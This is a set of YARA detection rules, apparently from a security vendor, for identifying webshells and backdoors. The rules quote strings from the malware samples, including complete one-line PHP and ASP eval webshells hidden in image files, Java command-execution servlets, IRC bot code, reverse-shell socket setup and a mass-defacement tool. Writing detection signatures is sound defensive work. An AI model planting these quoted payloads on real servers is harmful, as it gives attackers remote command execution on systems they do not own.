rule sig_1bae465ddef9bb5db4e2d4c17622e97aff33e173
{
    meta:
        description = "others - file 1bae465ddef9bb5db4e2d4c17622e97aff33e173.pl"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "c55e1bff6eb816dd9cc966c5d5d99236a724bd7cdb4d0595b32ec6cefbc19cf0"
    strings:
        $s1 = "sendraw(\"USER $ircname \".$IRC_socket->sockhost.\" $servidor_con :$realname\");" fullword ascii
        $s2 = "my $IRC_socket = new IO::Socket::INET(Proto=>\"tcp\", PeerAddr=>\"$servidor_con\", PeerPort=>$porta_con) or return(1);" fullword ascii
        $s3 = "# esse 'sub fixaddr' daki foi pego do NET::IRC::DCC identico soh copiei e coloei (colokar nome do autor)" fullword ascii
        $s4 = "return inet_ntoa(((gethostbyname($address))[4])[0]);" fullword ascii
        $s5 = "sendraw($IRC_cur_socket,\"PRIVMSG $printl :Nenhuma porta aberta foi encontrada\"); " fullword ascii
        $s6 = "while (!(keys(%irc_servers))) { conectar(\"$nick\", \"$servidor\", \"$porta\"); }" fullword ascii
        $s7 = "my @portas=(\"21\",\"22\",\"23\",\"25\",\"53\",\"80\",\"110\",\"143\",\"6667\",\"59\",\"7000\",\"110\",\"65535\",\"0\");" fullword ascii
        $s8 = "my $dccsock = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>$dccip, PeerPort=>$dccporta, Timeout=>15) or return (0);" fullword ascii
        $s9 = "my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto => 'tcp', Timeout => 4);" fullword ascii
        $s10 = "$irc_servers{$IRC_cur_socket}{'host'} = \"$servidor_con\";" fullword ascii
        $s11 = "$irc_servers{$IRC_cur_socket}{'meuip'} = $IRC_socket->sockhost;" fullword ascii
        $s12 = "4 \".int((($bytes{icmp}+$bytes{igmp}+$bytes{udp} + $bytes{o})/1024)/$dtime).\" kbps\");" fullword ascii
        $s13 = "sendraw($IRC_cur_socket, \"PRIVMSG $printl :portas abertas: @aberta\");" fullword ascii
        $s14 = "#my $processo = '/bin/bash';    #se comantar nao mostra o PID" fullword ascii
        $s15 = "$irc_servers{$IRC_cur_socket}{'porta'} = \"$porta_con\";" fullword ascii
        $s16 = "return(\"$sock_tipo\",\"$status\",\"$nick\",\"$arquivo\",\"$bytes_total\", \"$cur_byte\",\"$d_time\", \"$rate\", \"$porcen\");" fullword ascii
        $s17 = "} elsif ($address =~ /^[12]?\\d{1,2}\\.[12]?\\d{1,2}\\.[12]?\\d{1,2}\\.[12]?\\d{1,2}$/) {" fullword ascii
        $s18 = "$0=\"$processo\".\"\\0\"x16;;" fullword ascii
        $s19 = "if ($nread == 0 and $dcctipo =~ /^(get|sendcon)$/) {" fullword ascii
        $s20 = "$sendsock = IO::Socket::INET->new(Listen=>1, LocalPort =>$porta, Proto => 'tcp') and $dcc_sel->add($sendsock);" fullword ascii
    condition:
        ( uint16(0) == 0x2123 and filesize < 50KB and ( 8 of them ) ) or ( all of them )
}

rule sig_3b6114d1c2d05a85ef6ad9d1d1a242770061c430
{
    meta:
        description = "others - file 3b6114d1c2d05a85ef6ad9d1d1a242770061c430.java"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "70f6ddcbb39ff8fac130933bab7695b056cbf6c3730032c71f18a5a5f10d27e6"
    strings:
        $s1 = "// out.print(\"CONTENT_LEN = \" + req.getContentLength() + \" / TAG = [\" + tag + \"] / TAG_LEN = \" + tag.length() + \"\\n\");" fullword ascii
        $s2 = "for(int i=0; i < req.getContentLength() - tag.length() - contador - 11; i++) {" fullword ascii
        $s3 = "File newfile = new File(\"c:\\\\install.log\");" fullword ascii
        $s4 = "public void doPost(HttpServletRequest req, HttpServletResponse res) throws ServletException, IOException {" fullword ascii
        $s5 = "public void doGet(HttpServletRequest req, HttpServletResponse res) throws ServletException, IOException {" fullword ascii
        $s6 = "for(int i=0; i <4; i++) while((c=post.read()) != -1 && c != '\\n') contador++;" fullword ascii
        $s7 = "out.print(\"<br><form method=\\\"POST\\\" action=\\\"\\\" enctype=\\\"multipart/form-data\\\">\");" fullword ascii
        $s8 = "* @author The Dark Raver" fullword ascii
        $s9 = "while((c=post.read()) != -1 && c != '\\r' && c != '\\n') {" fullword ascii
        $s10 = "// out.print(\"CONTADOR = \" + contador + \" / FILE_LEN = \" + (req.getContentLength() - tag.length() - contador - 11) + \" ==>" ascii
        $s11 = "out.print(\"UPLOAD <input type=\\\"file\\\" name=\\\"file\\\" size=\\\"60\\\">\");" fullword ascii
        $s12 = "out.print(\"<input type=\\\"submit\\\" value=\\\"Upload\\\">\");" fullword ascii
        $s13 = "res.setContentType(\"text/html\");" fullword ascii
        $s14 = "* @version 0.1" fullword ascii
        $s15 = "ServletInputStream in = req.getInputStream();" fullword ascii
        $s16 = "DataInputStream post = new DataInputStream(in);" fullword ascii
        $s17 = "* UpServlet.java" fullword ascii
        $s18 = "PrintWriter out = res.getWriter();" fullword ascii
        $s19 = "public String getServletInfo() {" fullword ascii
        $s20 = "c=post.read();" fullword ascii
    condition:
        ( uint16(0) == 0x2a2f and filesize < 5KB and ( 8 of them ) ) or ( all of them )
}

rule sig_035b5e64aadb14237890bb3df89195acb33eb192
{
    meta:
        description = "others - file 035b5e64aadb14237890bb3df89195acb33eb192.pl"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "d3e9d59062a9ae2bfc20bf0acdbb83605c8463cca7452d7dcf0922abaeb90552"
    strings:
        $x1 = "$system = ($unix)?('echo \"`uname -a`\";echo \"`id`\";/bin/sh'):('cmd.exe'); " fullword ascii
        $x2 = "$SHELL=($unix)?('/bin/bash -i'):('cmd.exe');  " fullword ascii
        $s3 = "print \"<HTML><TITLE>r57pws - login</TITLE><BODY><div align=center><font face=verdana size=1>\";" fullword ascii
        $s4 = "## r57pws.pl - Perl Web Shell by RST/GHC" fullword ascii
        $s5 = "($ENV{'CONTENT_TYPE'} =~ /multipart\\/form-data; boundary=(.+)$/)?(&get_file($1)):(&get_val());" fullword ascii
        $s6 = "<noscript><a href=http://click.hotlog.ru/?81606 target=_top><imgsrc=\"http://hit4.hotlog.ru/cgi-bin/hotlog/count?s=81606&im=1\" " ascii
        $s7 = "<script language=\"javascript1.3\">hotlog_js=\"1.3\"</script><script language=\"javascript\">hotlog_r+=\"&js=\"+hotlog_js;docume" ascii
        $s8 = "<noscript><a href=http://click.hotlog.ru/?81606 target=_top><imgsrc=\"http://hit4.hotlog.ru/cgi-bin/hotlog/count?s=81606&im=1\" " ascii
        $s9 = "if($FORM{PASS} eq $password) { print \"Set-Cookie: PASS=\".cry($FORM{PASS}).\";\\nContent-type: text/html\\n\\n<meta HTTP-EQUIV=" ascii
        $s10 = "<title>$script_name - Perl Web Shell by RST/GHC</title>" fullword ascii
        $s11 = "(\"<a href='http://click.hotlog.ru/?81606' target='_top'><img \"+\" src='http://hit4.hotlog.ru/cgi-bin/hotlog/count?\"+hotlog_r+" ascii
        $s12 = "if(!$COOK{PASS}||($COOK{PASS} ne cry($password))) { &form_login; exit(); } " fullword ascii
        $s13 = "print $sock \"GET $path HTTP/1.0\\nHost: $server\\n\\n\";" fullword ascii
        $s14 = "'find config* files in current dir' => 'find . -type f -name \"config*\"'," fullword ascii
        $s15 = "'find config.inc.php files in current dir' => 'find . -type f -name config.inc.php'," fullword ascii
        $s16 = "=\"http://ghc.ru\" target=_blank>http://ghc.ru</a></font> ]};" fullword ascii
        $s17 = "'target=_blank><img src=\"http://counter.yadro.ru/hit?t52.6;r'+" fullword ascii
        $s18 = "&input('text','FILE','http://server.com/file.txt',49,undef);" fullword ascii
        $s19 = "$iaddr=inet_aton($target) || die(\"Error: $!\\n\"); " fullword ascii
        $s20 = "if($FORM{PASS} eq $password) { print \"Set-Cookie: PASS=\".cry($FORM{PASS}).\";\\nContent-type: text/html\\n\\n<meta HTTP-EQUIV=" ascii
    condition:
        ( uint16(0) == 0x2123 and filesize < 60KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_3eab1798cbc9ab3b2c67d3da7b418d07e775db70
{
    meta:
        description = "others - file 3eab1798cbc9ab3b2c67d3da7b418d07e775db70.jpg"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "791a882af2cea0aa8b8379791b401bebc235296858266ddb7f881c8923b7ea61"
    strings:
        $s1 = ";<%execute(request(\"cmd\"))%>" fullword ascii
        $s2 = "<?php eval($_POST[cmd]);?>" fullword ascii
    condition:
        ( uint16(0) == 0x4947 and filesize < 10KB and ( all of them ) ) or ( all of them )
}

rule sig_483911a0938f08984f634daf82a573b75162a2ff
{
    meta:
        description = "others - file 483911a0938f08984f634daf82a573b75162a2ff.java"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "5658a2c5b43285c407267be9f54d545eb346e37b7f314c276550b9a600463929"
    strings:
        $s1 = "ResultSet r = m.executeQuery(q.indexOf(\"--f:\")!=-1?q.substring(0,q.indexOf(\"--f:\")):q);" fullword ascii
        $s2 = "Process p = Runtime.getRuntime().exec(c);" fullword ascii
        $s3 = "ResultSet r = m.executeQuery(\"select * from \" + x[x.length-1]);" fullword ascii
        $s4 = "public void doPost(HttpServletRequest request, HttpServletResponse response)throws ServletException, IOException {" fullword ascii
        $s5 = "sb.append(\"Execute Successfully!\\t|\\t\\r\\n\");" fullword ascii
        $s6 = "sb.append(l[i].getName() + \"/\\t\" + sT + \"\\t\" + l[i].length()+ \"\\t\" + sQ + \"\\n\");" fullword ascii
        $s7 = "ResultSet r = s.indexOf(\"jdbc:oracle\")!=-1?c.getMetaData().getSchemas():c.getMetaData().getCatalogs();" fullword ascii
        $s8 = "cs = request.getParameter(\"z0\") != null ? request.getParameter(\"z0\")+ \"\":cs;" fullword ascii
        $s9 = "sF+=l[i].getName() + \"\\t\" + sT + \"\\t\" + l[i].length() + \"\\t\"+ sQ + \"\\n\";" fullword ascii
        $s10 = "sb.append(d.getColumnName(i) + \" (\" + d.getColumnTypeName(i)+ \")\\t\");" fullword ascii
        $s11 = "os.write((h.indexOf(d.charAt(i)) << 4 | h.indexOf(d.charAt(i + 1))));" fullword ascii
        $s12 = "public void doGet(HttpServletRequest request, HttpServletResponse response)" fullword ascii
        $s13 = "xOf(\"--f:\") + 4,q.length()).trim()),true),cs));" fullword ascii
        $s14 = "m.executeUpdate(q);" fullword ascii
        $s15 = "String s = request.getSession().getServletContext().getRealPath(\"/\");" fullword ascii
        $s16 = "HH(s + \"/\" + z[j].getName(), d + \"/\" + z[j].getName());" fullword ascii
        $s17 = "sb.append(r.getString(\"TABLE_NAME\") + \"\\t\");" fullword ascii
        $s18 = "BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(new File(z1))));" fullword ascii
        $s19 = "String z1 = EC(request.getParameter(\"z1\") + \"\");" fullword ascii
        $s20 = "String z2 = EC(request.getParameter(\"z2\") + \"\");" fullword ascii
    condition:
        ( uint16(0) == 0x6170 and filesize < 30KB and ( 8 of them ) ) or ( all of them )
}

rule sig_2db1b4ebaf31a105231b7f3fef7d1fb9b6b3d0fb
{
    meta:
        description = "others - file 2db1b4ebaf31a105231b7f3fef7d1fb9b6b3d0fb.soap"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "6a0578b389fa8db8c4cb87236c14d470855fa742909dd5bb51a61bb04b0e371a"
    strings:
        $s1 = "R += String.Format(\"{0}/\\t{1}\\t0\\t-\\n\", D.Name, File.GetLastWriteTime(Z1 + D.Name).ToString(\"yyyy-MM-dd hh:mm:ss\"));" fullword ascii
        $s2 = "R = \"Result\\t|\\t\\r\\nExecute Successfully!\\t|\\t\\r\\n\";" fullword ascii
        $s3 = "R += String.Format(\"{0}\\t{1}\\t{2}\\t-\\n\", D.Name, File.GetLastWriteTime(Z1 + D.Name).ToString(\"yy" fullword ascii
        $s4 = "R += String.Format(\"{0}/\\t{1}\\t0\\t-\\n\", D.Name, File.GetLastWriteTime(Z1 + D.Name).ToString(\"yyy" fullword ascii
        $s5 = "if (strDat.IndexOf(\"SELECT \") == 0 || strDat.IndexOf(\"EXEC \") == 0 || strDat.IndexOf(\"DECLARE \") == 0)" fullword ascii
        $s6 = "if (strDat.IndexOf(\"SELECT \") == 0 || strDat.IndexOf(\"EXEC \") == 0 || strDat.IndexOf(\"DECLARE \") == " fullword ascii
        $s7 = "cm.ExecuteNonQuery();" fullword ascii
        $s8 = "ProcessStartInfo c = new ProcessStartInfo(Z1.Substring(2));" fullword ascii
        $s9 = "c.UseShellExecute = false;" fullword ascii
        $s10 = "[WebService(Namespace = \"http://www.wooyun.org/whitehats/RedFree\")]" fullword ascii
        $s11 = "HttpWebResponse WB = (HttpWebResponse)RQ.GetResponse();" fullword ascii
        $s12 = "SqlCommand cm = Conn.CreateCommand();" fullword ascii
        $s13 = "cm.CommandText = Z2;" fullword ascii
        $s14 = "Process e = new Process();" fullword ascii
        $s15 = "File.Copy(S + \"\\\\\" + F.Name, D + \"\\\\\" + F.Name);" fullword ascii
        $s16 = "[WebServiceBinding(ConformsTo = WsiProfiles.BasicProfile1_1)]" fullword ascii
        $s17 = "R = Conn.Database + \"\\t\";" fullword ascii
        $s18 = "using System.Web.Services.Protocols;" fullword ascii
        $s19 = "DataTable dt = Conn.GetSchema(\"Columns\");" fullword ascii
        $s20 = "DataTable dt = Conn.GetSchema(\"Columns\", p);" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 40KB and ( 8 of them ) ) or ( all of them )
}

rule e52310d87069aac1bda03b21b3ddc023f182b7f8
{
    meta:
        description = "others - file e52310d87069aac1bda03b21b3ddc023f182b7f8.ashx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "fdfb1849f0e99ebe1c390086a0162fdbeb89b76e3a89ce2bd3640da5824f8ead"
    strings:
        $s1 = "file1.Write(\"<%response.clear:execute request(\\\"root\\\"):response.End%>\");" fullword ascii
        $s2 = "public void ProcessRequest (HttpContext context) {" fullword ascii
        $s3 = "StreamWriter file1= File.CreateText(context.Server.MapPath(\"root.asp\"));" fullword ascii
        $s4 = "context.Response.ContentType = \"text/plain\";" fullword ascii
        $s5 = "using System.Web;" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule f1909a6e495b025b252194daac354c72d0a597d8
{
    meta:
        description = "others - file f1909a6e495b025b252194daac354c72d0a597d8.java"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "bb0ba3a3d07fd6a3d68ac536f4ad0fe2daf94abcb4d78bae4cb7a96bb35d1a5e"
    strings:
        $s1 = "ResultSet r = m.executeQuery(q.indexOf(\"--f:\")!=-1?q.substring(0,q.indexOf(\"--f:\")):q);" fullword ascii
        $s2 = "Process p = Runtime.getRuntime().exec(c);" fullword ascii
        $s3 = "ResultSet r = m.executeQuery(\"select * from \" + x[x.length-1]);" fullword ascii
        $s4 = "public void doPost(HttpServletRequest request, HttpServletResponse response)throws ServletException, IOException {" fullword ascii
        $s5 = "sb.append(\"Execute Successfully!\\t|\\t\\r\\n\");" fullword ascii
        $s6 = "sb.append(l[i].getName() + \"/\\t\" + sT + \"\\t\" + l[i].length()+ \"\\t\" + sQ + \"\\n\");" fullword ascii
        $s7 = "ResultSet r = s.indexOf(\"jdbc:oracle\")!=-1?c.getMetaData().getSchemas():c.getMetaData().getCatalogs();" fullword ascii
        $s8 = "cs = request.getParameter(\"z0\") != null ? request.getParameter(\"z0\")+ \"\":cs;" fullword ascii
        $s9 = "sF+=l[i].getName() + \"\\t\" + sT + \"\\t\" + l[i].length() + \"\\t\"+ sQ + \"\\n\";" fullword ascii
        $s10 = "sb.append(d.getColumnName(i) + \" (\" + d.getColumnTypeName(i)+ \")\\t\");" fullword ascii
        $s11 = "os.write((h.indexOf(d.charAt(i)) << 4 | h.indexOf(d.charAt(i + 1))));" fullword ascii
        $s12 = "public void doGet(HttpServletRequest request, HttpServletResponse response)" fullword ascii
        $s13 = "xOf(\"--f:\") + 4,q.length()).trim()),true),cs));" fullword ascii
        $s14 = "m.executeUpdate(q);" fullword ascii
        $s15 = "String s = request.getSession().getServletContext().getRealPath(\"/\");" fullword ascii
        $s16 = "HH(s + \"/\" + z[j].getName(), d + \"/\" + z[j].getName());" fullword ascii
        $s17 = "sb.append(r.getString(\"TABLE_NAME\") + \"\\t\");" fullword ascii
        $s18 = "BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(new File(z1))));" fullword ascii
        $s19 = "String z1 = EC(request.getParameter(\"z1\") + \"\");" fullword ascii
        $s20 = "String z2 = EC(request.getParameter(\"z2\") + \"\");" fullword ascii
    condition:
        ( uint16(0) == 0x6170 and filesize < 30KB and ( 8 of them ) ) or ( all of them )
}

rule sig_0a46f25cefc8c1741ffd86794f955ca99e13209e
{
    meta:
        description = "others - file 0a46f25cefc8c1741ffd86794f955ca99e13209e.JPG"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "59ec34ad3bc754b522d22499d584c8ba54e700acf2bbb3c5f36f728f9e4ce9cc"
    strings:
        $s1 = "\"<?fputs(fopen(\"TNT.PHP\",\"w\"),\"<?eval(\\$_POST[TNT]);?>\")?>\"<%execute(request(\"TNT\"))%><?php eval($_POST[TNT]);?> <% @" ascii
        $s2 = "\"<?fputs(fopen(\"TNT.PHP\",\"w\"),\"<?eval(\\$_POST[TNT]);?>\")?>\"<%execute(request(\"TNT\"))%><?php eval($_POST[TNT]);?> <% @" ascii
        $s3 = "ge=\"Jscript\"%><%eval(Request.Item[\"TNT\"],\"unsafe\");%>" fullword ascii
    condition:
        ( uint16(0) == 0xd8ff and filesize < 20KB and ( all of them ) ) or ( all of them )
}

rule sig_39fec812b845b0b5ba594745a47fd8f03c156d9e
{
    meta:
        description = "others - file 39fec812b845b0b5ba594745a47fd8f03c156d9e.jpg"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "9ed2e36a93c56325fb1c5c61ad02d7f21a2c6692e71b9bf3a965241271f5c138"
    strings:
        $s1 = "<?php @eval($_POST['ice']);?>" fullword ascii
    condition:
        ( uint16(0) == 0xd8ff and filesize < 20KB and ( all of them ) ) or ( all of them )
}

rule d5c66efea4273fd3b27c497749b00dbae0e4fb83
{
    meta:
        description = "others - file d5c66efea4273fd3b27c497749b00dbae0e4fb83.class"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "41ac1d141f5fbcb1ec57dc25fbda6f5d7a1e154d7e9f9e34369f64dc1a35aeb7"
    strings:
        $s1 = "'(Ljava/lang/String;)Ljava/lang/Process;" fullword ascii
        $s2 = "cmd /c " fullword ascii
        $s3 = "R(Ljavax/servlet/http/HttpServletRequest;Ljavax/servlet/http/HttpServletResponse;)V" fullword ascii
        $s4 = "2<hr><p><form method=\"GET\" name=\"myform\" action=\"\">" fullword ascii
        $s5 = "<hr><p><b>Command: " fullword ascii
        $s6 = "<input type=\"text\" name=\"cmd\">" fullword ascii
        $s7 = "%javax/servlet/http/HttpServletRequest" fullword ascii
        $s8 = "&javax/servlet/http/HttpServletResponse" fullword ascii
        $s9 = "CmdServlet.java" fullword ascii
    condition:
        ( uint16(0) == 0xfeca and filesize < 5KB and ( all of them ) ) or ( all of them )
}

rule sig_45648afcc15aa7340082d165c13d885889d5a252
{
    meta:
        description = "others - file 45648afcc15aa7340082d165c13d885889d5a252.cgi"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "0c69b3d62baf07e3164c772b219ab5d0bc09d16d638c99c44cf5afe7b0ced65f"
    strings:
        $s1 = "AAAAAAAAAAAAAAB" ascii /* base64 encoded string '           ' */ /* reversed goodware string 'BAAAAAAAAAAAAAA' */
        $s2 = "target.style.background = '\".$shell_color.\"';" fullword ascii
        $s3 = "var pola = 'example: (using netcat) run &quot;nc -l -p __PORT__&quot; and then press Connect';" fullword ascii
        $s4 = "$shell_password = \"devilzc0der\";" fullword ascii
        $s5 = "<input style=\\\"width:300px;\\\" type=\\\"text\\\" name=\\\"childname\\\" value=\\\"\".$shell_name.\".cgi\\\"; />" fullword ascii
        $s6 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFVQWDAAAAAA" fullword ascii /* base64 encoded string '                                                 UPX0    ' */
        $s7 = "<input style=\\\"width:100px;\\\" type=\\\"submit\\\" class=\\\"btn\\\" name=\\\"btnNewUploadLocal\\\" value=\\\"Get\\\" />" fullword ascii
        $s8 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAF" ascii /* base64 encoded string '                                                 ' */
        $s9 = "$shell_fake_name = \"Server Logging System\";" fullword ascii
        $s10 = "AFZpcnR1YWxQcm90ZWN0AABWaXJ0dWFsQWxsb2MAAFZpcnR1YWxGcmVlAAAARXhpdFByb2Nlc3MA" fullword ascii /* base64 encoded string ' VirtualProtect  VirtualAlloc  VirtualFree   ExitProcess ' */
        $s11 = "AABPcGVuU2VydmljZUEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" fullword ascii /* base64 encoded string '  OpenServiceA                                           ' */
        $s12 = "TEwAQURWQVBJMzIuZGxsAFdTMl8zMi5kbGwAAExvYWRMaWJyYXJ5QQAAR2V0UHJvY0FkZHJlc3MA" fullword ascii /* base64 encoded string 'LL ADVAPI32.dll WS2_32.dll  LoadLibraryA  GetProcAddress ' */
        $s13 = "$wBind=\"TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" fullword ascii
        $s14 = "$chunk = substr(pack(\"u\", $_), $[+1, int((length($_)+2)/3)*4 - (45-length($_))%3);" fullword ascii
        $s15 = "var target = document.getElementById(address);" fullword ascii
        $s16 = "<tr><td style=\\\"width:120px;\\\">New Shellname</td><td style=\\\"width:304px;\\\">" fullword ascii
        $s17 = "<td style=\\\"width:10%;\\\"><input type=\\\"submit\\\" class=\\\"btn\\\" name=\\\"btnCommand\\\" style=\\\"width:120px;\\\" val" ascii
        $s18 = "<td style=\\\"width:10%;\\\"><input type=\\\"submit\\\" class=\\\"btn\\\" name=\\\"btnCommand\\\" style=\\\"width:120px;\\\" val" ascii
        $s19 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                ' */
        $s20 = "################# FUNCTION GOES HERE #######################==============================================]" fullword ascii
    condition:
        ( uint16(0) == 0x2123 and filesize < 100KB and ( 8 of them ) ) or ( all of them )
}

rule sig_56f06ecd94eceb07373ce45d699b4ef13cbcd7d1
{
    meta:
        description = "others - file 56f06ecd94eceb07373ce45d699b4ef13cbcd7d1.jpg"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "e05f8fdf608e2fdb3af3a3204353d1b259ff47863ff800404dde27223a34685b"
    strings:
        $s1 = "java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"i\")).getInputStream();" fullword ascii
        $s2 = "if(\"023\".equals(request.getParameter(\"pwd\"))){" fullword ascii
    condition:
        ( uint16(0) == 0x4947 and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule c580c6ebcc4d375305340c782ed4c5075bc2ba75
{
    meta:
        description = "others - file c580c6ebcc4d375305340c782ed4c5075bc2ba75.pl"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "46f7392c18b35140da2319123e07e40cb070cecc4cee976db020b20ed9affc6d"
    strings:
        $s1 = "\"Exemplo:\\nperl ka0s_over.pl -d /www -f index. -n /tmp/index.html\\n\"." fullword ascii
        $s2 = "# Retirada fun??es system(); e o comando find que da erro em Sistemas Operacionais," fullword ascii
        $s3 = "[sap0@localhost tmp]$ perl ka0s_over -d /home/www/ -f index. -n /tmp/index.html" fullword ascii
        $s4 = "\"\\n- = [ Ka0tic Lab Tool for Mass Defacement $VERSION ] = -\\n\"." fullword ascii
        $s5 = "- = [ Ka0tic Lab Tool for Mass Defacement Version 0.3 by S4P0 ] = -" fullword ascii
        $s6 = "#IRC: irc.GigaChat.org - irc.EFnet.org - Canal #Ka0tic" fullword ascii
        $s7 = "perl ka0s_over.pl -d / -f index. -n /tmp/index.html" fullword ascii
        $s8 = "\"\\t     \\#IRC: irc.GigaChat.org - irc.EFnet.org - Canal \\#Ka0tic\\n\"." fullword ascii
        $s9 = "################################## ABOUT ###################################################" fullword ascii
        $s10 = "[+] Ok, Novo arquivo a ser colocado: /tmp/index.html" fullword ascii
        $s11 = "[+] Ok, Diretorio dos arquivos: /www/" fullword ascii
        $s12 = "# N?o se esque?a de colocar um diret?rio espec?ficado, s? / n?o funciona. Coloquei esse" fullword ascii
        $s13 = "################################################################################################@" fullword ascii
        $s14 = "#-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-@" fullword ascii
        $s15 = "[+] Arquivos Substituidos com Sucesso!" fullword ascii
        $s16 = "# Detalhe at? por que se colocar / ele ir? fazer uma pesquisa muito grande e muito demorada," fullword ascii
        $s17 = "printf \"[+] Arquivos Substituidos com Sucesso!\\n\";sleep(1);" fullword ascii
        $s18 = "[+] Total de Arquivos substituidos: 4873" fullword ascii
        $s19 = "[+] Ok, O arquivo a ser substituido: index." fullword ascii
        $s20 = "# que n?o o Possuem. E colocado um programa em perl que procura e troca." fullword ascii
    condition:
        ( uint16(0) == 0x2123 and filesize < 10KB and ( 8 of them ) ) or ( all of them )
}

rule sig_9276bde678d26fab0e68850d17263ec734dfacc2
{
    meta:
        description = "others - file 9276bde678d26fab0e68850d17263ec734dfacc2.pl"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "6087bae5ea77ef3fd63dcbbf705bf645d2069e702dcb535fbd56e0b652ffa1eb"
    strings:
        $s1 = "open(CMD, \"($cmd) 2>&1 |\") || print \"Could not execute command\";" fullword ascii
        $s2 = "print \"Results of '$cmd' execution:\\n\\n\";" fullword ascii
        $s3 = "# PerlKit-0.1 - http://www.t0s.org" fullword ascii
        $s4 = "# cmd.pl: Run commands on a webserver" fullword ascii
        $s5 = "<input type=\"text\" name=\"cmd\" size=45 value=\"' . $cmd . '\">" fullword ascii
        $s6 = "# Get parameters" fullword ascii
        $s7 = "print \"Content-Type: text/html\\r\\n\";" fullword ascii
        $s8 = "$value =~ s/\\+/ /g ;" fullword ascii
        $s9 = "<form action=\"\" method=\"GET\">" fullword ascii
        $s10 = "if(defined $FORM{'cmd'}) {" fullword ascii
        $s11 = "$cmd = $FORM{'cmd'};" fullword ascii
        $s12 = "<input type=\"submit\" value=\"Run\">" fullword ascii
        $s13 = "my ($cmd, %FORM);" fullword ascii
    condition:
        ( uint16(0) == 0x2123 and filesize < 3KB and ( 8 of them ) ) or ( all of them )
}

rule sig_1c771a898933d2425343f6fca3c7cb16610a77e1
{
    meta:
        description = "others - file 1c771a898933d2425343f6fca3c7cb16610a77e1.pl"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "61e4a8216cb5e14e2416f3a23ad93c89056b1d761a3a20cd34bb1c7b9509cc92"
    strings:
        $x1 = "<table class=info id=toolsTbl cellpadding=0 cellspacing=0 width=100%  style='border-top:2px solid #333;border-bottom:2px solid #" ascii
        $x2 = "&PrintDownloadLinkPage($TargetFile);}}sub SystemInfo{sub langs {$s = \"which gcc;which perl;which python;which php;which tar;whi" ascii
        $s3 = "$dbb=$Cookies{'dbb'};$table=$Cookies{'table'};&PrintPageHeader(\"c\");sql_vars_set();sql_loginform();$column=$in{'column'};" fullword ascii
        $s4 = "DPWD'} eq $Password;if($Action eq \"login\" || !$LoggedIn){&PerformLogin;}elsif($Action eq \"command\"){&ExecuteCommand;}elsif($" ascii
        $s5 = "&ReadParse;&GetCookies;$ScriptLocation=$ENV{'SCRIPT_NAME'};$ServerName=$ENV{'SERVER_NAME'};$LoginPassword=$in{'p'};$RunCommand=$" ascii
        $s6 = "= \"/bin/bash\";use Socket;use FileHandle;socket(SOCKET, PF_INET, SOCK_STREAM, getprotobyname(\"tcp\")) or die print \"[-] Unabl" ascii
        $s7 = "sub sql_databases{sql_vars_set();&PrintPageHeader(\"c\");sql_vars_set();sql_loginform();$ddb = $in{'database'};" fullword ascii
        $s8 = "$Password = \"63a9f0ea7bb98050796b649e85481845\";# - root [md5]" fullword ascii
        $s9 = "sub NetGo{&PrintPageHeader(\"c\");$target =  $in{'server'};$port =  $in{'ppport'};NetForm();back();&PrintPageFooter;}" fullword ascii
        $s10 = "sub sql_query{sql_vars_set();&GetCookies;$hhost=$Cookies{'hhost'};$pport=$Cookies{'pport'};$usser=$Cookies{'usser'};$passs=$Cook" ascii
        $s11 = ";$pport=$in{'sql_port'};$usser=$in{'sql_login'};$passs=$in{'sql_pass'};$dbb=$in{'sql_db'};}sub sql_query_form{" fullword ascii
